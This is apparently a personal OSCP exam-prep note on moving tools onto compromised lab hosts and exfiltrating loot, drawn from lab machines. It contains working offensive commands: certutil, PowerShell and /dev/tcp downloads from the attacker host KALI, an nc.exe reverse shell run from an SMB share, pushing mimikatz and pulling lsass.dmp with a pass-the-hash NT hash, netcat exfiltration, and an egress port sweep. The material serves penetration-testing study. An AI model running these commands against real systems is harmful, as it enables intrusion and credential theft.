---
title: "File Transfers"
slug: file-transfers
category: notes
handbook: oscp
tags: ["file-transfers"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Getting tools onto a target after a foothold, and pulling loot back off it."
---
Getting tools onto a target after a foothold, and pulling loot back off it. Serve the file from Kali, pull it from the target. `KALI` below is the Kali address reachable from the target, `TARGET` the target's address. Write into a writable directory such as `/tmp` or `/dev/shm` on Linux, or `C:\Windows\Temp` on Windows, when the landing directory is read only.

## Serve from Kali

```bash
# HTTP, the default
sudo python3 -m http.server 80

# SMB, when the target prefers it or needs to run a binary straight from the share
impacket-smbserver share . -smb2support
```

`-smb2support` is needed for modern Windows clients, which refuse SMB1.

## Windows download

certutil ships with every modern Windows and pulls a file over HTTP:

```cmd
certutil -urlcache -split -f http://KALI/nc.exe nc.exe
```

- `-urlcache -split -f`: force a fresh download instead of serving a cached copy.
- The final argument is the output filename. Left off, certutil names the file from the URL and can leave cache clutter.

PowerShell alternatives:

```powershell
powershell -c "Invoke-WebRequest http://KALI/nc.exe -OutFile nc.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI/nc.exe','nc.exe')"
```

`Invoke-WebRequest` is simplest but slow and absent on very old hosts. `Net.WebClient` works back to older PowerShell.

`DownloadFile` and `WebClient` write to an exact path, and the destination directory has to exist first. Downloading to `C:\Temp\nc.exe` when `C:\Temp` is absent throws `An exception occurred during a WebClient request`. Create or confirm the directory before pulling into it, and prefer one known to exist:

```cmd
mkdir C:\Temp
dir C:\Temp
```

On Nickel this cost time: `C:\Windows\Temp` was a dead end and `C:\Temp` did not exist, so the download failed until `C:\Temp` was created.

From an SMB share served by impacket, run a binary without copying it to disk first:

```cmd
\\KALI\share\nc.exe -e cmd KALI 4444
copy \\KALI\share\winPEAS.exe .
```

## Push and pull over SMB (admin credential)

With SMB admin access already in hand (a password, or an NT hash that shows `Pwn3d!`), NetExec moves files either direction over 445, no HTTP server, no listener, and nothing staged on the target. Kali always initiates the connection, so this is the method when the target cannot reach back to Kali (egress filtered, or a one-way routed path):

```bash
nxc smb TARGET -u Administrator -H <hash> --put-file ./mimikatz.exe '\Windows\Temp\mimikatz.exe'   # Kali -> target
nxc smb TARGET -u Administrator -H <hash> --get-file '\Windows\Temp\lsass.dmp' lsass.dmp            # target -> Kali
```

The remote path is relative to the `C$` share. `impacket-smbclient '<user>:<pass>@TARGET'` then `put` / `get` does the same interactively.

On GOAD-Light the `certutil` HTTP pull failed because the lab hosts have no route back to Kali's Tailscale address (the same one-way routing that stops Responder), so mimikatz was pushed in with `--put-file` instead.

## Linux download

```bash
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh
curl http://KALI/linpeas.sh -o /tmp/linpeas.sh
```

When neither is present, pull the file over a bash TCP socket ([nc](/collections/oscp/nc)), or base64 the content and paste it. `/dev/tcp` is a raw socket, not an HTTP client, so serve the file raw rather than pointing it at the same `http.server` used above, otherwise the response headers land in the file along with the bytes:

```bash
# Kali: serve the raw file, not an HTTP server
nc -lvnp 8000 < linpeas.sh

# target: bash /dev/tcp, no wget or curl needed
cat < /dev/tcp/KALI/8000 > /tmp/linpeas.sh

# base64 on Kali, decode on the target, useful over a raw shell with no network path back
base64 -w0 tool.bin        # copy the output
echo <base64> | base64 -d > tool.bin
```

Stripped official-image containers (a bare `postgres`/`mysql` Docker base, for example) are the case most likely to have neither `wget` nor `curl`, but still ship real `bash`. Peppo's postgres container had neither, plus no `python` for the usual PTY upgrade either.

Download the file and run it, do not pipe the fetch straight into a shell. `curl http://kali/linpeas.sh | sh` fails badly on an old target: if `curl` is absent, Debian's `command_not_found` helper runs in its place and its advisory text is what gets piped into `sh`, so the shell tries to execute each word of an error message. A legacy box also means `python` may be 2.x and `wget` or `/dev/tcp` are the working paths. On PayDay (Python 2.5) that pipe produced a screen of `sh: Whoops,: not found` noise and never touched linpeas.

## Exfiltrate from the target

Pulling a file off the target back to Kali, the reverse of the downloads above. Use whichever channel is already open.

### evil-winrm (preferred when that is the shell)

```
download C:/temp/all.sql /home/kali/loot/all.sql
upload /home/kali/tools/winPEASany.exe C:/temp/winPEASany.exe
```

Remote path first on `download`, local first on `upload`. Use forward slashes in remote paths because [evil-winrm](/collections/oscp/evil-winrm)'s command parser consumes backslashes. Absolute paths. Same session as the shell; no extra listener. See [Windows Remote Access](/collections/oscp/windows-remote-access).

### scp / SMB / netcat

SSH with `scp`, when the target runs SSH and creds are in hand: the same channel the shell already uses, no listener, and no dependence on target egress since Kali opens the connection. From a Windows OpenSSH target, use forward slashes and quote the path:

```bash
scp ariah@TARGET:"C:/ftp/infrastructure.pdf" .   # target to Kali
```

On a Linux target the same pull works for a single file, a wildcard, or a whole directory. Quote the wildcard so the remote shell expands it instead of the local one:

```bash
scp stuart@<target>:/opt/backup/sitebackup1.zip .
scp 'stuart@<target>:/opt/backup/*.zip' .
scp -r stuart@<target>:/opt/backup ./backup
```

When the server has its SFTP subsystem disabled, `scp` refuses and the same SSH session still reads the file out:

```bash
ssh stuart@<target> 'cat /opt/backup/sitebackup1.zip' > sitebackup1.zip
```

A login banner printed by the remote shell prepends text and corrupts binary output, so verify the pull with `unzip -t` or a size check against the target's `ls -l`.

On Nickel the password-protected PDF came off the box this way over ariah's SSH, then cracked with [Password Cracking](/collections/oscp/password-cracking).

SMB, by serving a writable share from Kali and copying into it from the target:

```bash
# Kali
impacket-smbserver share . -smb2support -user m -password m
# target (Windows)
net use \\KALI\share /user:m m
copy C:\ftp\infrastructure.pdf \\KALI\share\
```

### Pulling loot from a box behind a pivot

When the target sits on an internal subnet reached through a tunnel, "easiest" splits on admin rights. With local admin (or readable `C$`), skip the shell entirely and pull the file from Kali through the tunnel:

```bash
smbclient //172.16.237.11/C$ -U 'medtech.com/joe'
# password, then cd to the directory and: get file.log
nxc smb 172.16.237.11 -u joe -p 'pass' --get-file "Users\joe\Documents\file.log" .
```

Without admin, the target still needs an upload channel relayed to Kali: a ligolo listener forwards a pivot port to Kali ([Ligolo-ng](/collections/oscp/ligolo-ng)), an upload-capable server catches on Kali, and the target pushes to the pivot's internal IP. Windows SMB cannot substitute here because its client hardcodes port 445, which every Windows server already owns:

```text
# ligolo console
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
```

```bash
python3 -m uploadserver 8000          # on Kali, accepts uploads
```

```cmd
curl.exe -T file.log http://<pivot_internal_ip>:8000/upload
```

Over a raw shell with no scp or SMB, send the bytes over netcat, or base64 the file and paste it back the other way:

```bash
# Kali catches the file
nc -lvnp 80 > loot.bin
# target sends it (nc.exe on Windows)
nc KALI 80 < file.bin
```

netcat gives no progress output and no confirmation, and a truncated file still extracts partway, so check the size against the listing that found it:

```bash
ls -l loot.bin        # compare with the ls -l on the target
md5sum loot.bin
```

## Egress filtering

Use the port the reverse shell came back on. It has already proven it can leave the target, and no other port has. Reaching for 443 out of habit means debugging a network problem on top of a transfer, which is what happened on Ochima where outbound 443 was dropped and 80 carried both the shell and the 3.8 MB backup.

How the target-side command fails names the cause:

- **Hangs until Ctrl+C.** The SYN left and nothing answered, so it was dropped in transit. That is a filter, and the port is not usable in that direction.
- **Returns `Connection refused` at once.** The packet reached a host that answered, so the path is fine and nothing is listening. Wrong port, or the listener is not running.
- **Returns instantly with no message at all.** Often no netcat on the target, with the error swallowed by a non-interactive shell. Confirm with `command -v nc` or `nc --help`, or skip the binary entirely with bash's own TCP support:

```bash
echo hi > /dev/tcp/KALI/80 && echo SENT || echo FAILED
```

To see whether anything arrives rather than inferring it, watch the interface on Kali while retrying from the target. This separates "the target never sent it" from "Kali is dropping it":

```bash
sudo tcpdump -i tun0 -n 'tcp and src TARGET'
```

tcpdump sees the SYNs with no listener bound, so one sweep from the target maps every allowed egress port at once:

```bash
for p in 21 22 25 53 80 139 443 445 3389 8080; do
  timeout 1 bash -c "echo > /dev/tcp/KALI/$p" 2>/dev/null
done
```

Egress filtering only blocks connections the target opens. When every outbound port is closed, invert the direction and let Kali connect in: serve the file from the target with `python3 -m http.server` and fetch it with `curl -O`, or use `scp` if SSH is up. Choosing the callback port itself is covered in [Reverse Shells](/collections/oscp/reverse-shells#choosing-the-callback-port).

Related: Kevin, Nickel, Ochima, [winPEAS](/collections/oscp/winpeas), [LinPEAS](/collections/oscp/linpeas), [Reverse Shells](/collections/oscp/reverse-shells), [Password Cracking](/collections/oscp/password-cracking).
